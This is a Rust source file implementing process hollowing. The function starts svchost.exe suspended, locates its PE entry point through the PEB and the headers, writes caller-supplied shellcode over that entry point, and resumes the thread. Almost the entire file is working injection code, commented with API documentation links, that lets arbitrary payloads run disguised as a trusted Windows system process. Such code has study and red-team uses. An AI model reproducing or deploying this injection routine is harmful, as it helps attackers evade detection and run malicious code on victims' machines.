extern crate windows;
use std::{mem, ptr};
use std::ffi::{CString, c_void};
use windows::Win32::Foundation::PSTR;
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA};
use std::{thread, time};

const POINTER_SIZE: usize = mem::size_of::<&u8>();
const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
const E_LFANEW_OFFSET: usize = 0x3C;
const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;

pub fn hollow_and_run(shellcode: &[u8]) {
    let time = time::Duration::from_millis(20000);
    // Create empty StartupInfoA struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
    let startup_info: STARTUPINFOA = unsafe { mem::zeroed() };

    // Create empty ProcessInformation struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
    let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    // Use CreateProcessW to create a suspended process that will be hollowed out for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
    let lp_application_name: PSTR = unsafe { mem::zeroed() };
    let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
    lp_command_line.0 = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap().into_raw() as *mut u8;
    let lp_process_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
    let lp_thread_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
    let lp_environment: c_void = unsafe { mem::zeroed() };
    let lp_current_directory: PSTR = unsafe { mem::zeroed() };
    let creation_result = unsafe { CreateProcessA(
        lp_application_name,
        lp_command_line,
        &lp_process_attributes,
        &lp_thread_attributes,
        false,
        CREATE_SUSPENDED,
        &lp_environment,
        &lp_current_directory,
        &startup_info,
        &mut process_information) };
    if !creation_result.as_bool() {
        panic!("Could not create the suspended process with CreateProcessA");
    }

    // Create empty PROCESS_BASIC_INFORMATION struct for use in ZwQueryInformationProcess
    // WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
    let process_handle = process_information.hProcess;
    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
    
    // Get the PEB base address of the suspended process with ZwQueryInformationProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
    if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, 0, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
        panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
    }

    // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
    let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
    let mut address_buffer = [0; POINTER_SIZE];
    let read_result = unsafe { ReadProcessMemory(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as _, address_buffer.len(), ptr::null_mut()) };
    if !read_result.as_bool() {
        panic!("Could not read the address of the code base with ReadProcessMemory");
    }

    // Use ReadProcessMemory again to read 512 bytes of memory; the DOS header
    let pe_base_address = rco_utils::array_to_u64_lit_end(&address_buffer);
    let mut header_buffer = [0; 0x200];
    let read_result = unsafe { ReadProcessMemory(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as _, header_buffer.len(), ptr::null_mut()) };
    if !read_result.as_bool() {
        panic!("Could not read the DOS header with ReadProcessMemory");
    } else if header_buffer[0] != 77 || header_buffer[1] != 90 {
        panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
    }

    // Write the shellcode to the suspended process with WriteProcessMemory
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let e_lfanew = rco_utils::array_to_u32_lit_end(&header_buffer[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 0x04].try_into().unwrap());
    let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
    let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
    let entry_point_address = entry_point_rva as u64 + pe_base_address;
    if header_buffer[e_lfanew as usize + 0x18] != 11 || header_buffer[e_lfanew as usize + 0x19] != 2 {
        panic!("An offset looks incorrect, the optional header magic bytes don't correspond to '0x020B'");
    }

    let write_result = unsafe { WriteProcessMemory(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut()) };
    if !write_result.as_bool() {
        panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
    }

    let pid = basic_information.UniqueProcessId;
    let near = entry_point_address as usize + shellcode.len() - 32;
    println!("PID --> {pid}");
    println!("Entry point --> {entry_point_address:x}");
    println!("Near buffer end --> {near:x}");
    thread::sleep(time);

    // Start it back up with ResumeThread
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
    let resume_result = unsafe { ResumeThread(process_information.hThread) };
    if resume_result != 1 {
        panic!("Could not resume the suspended process' execution");
    }
}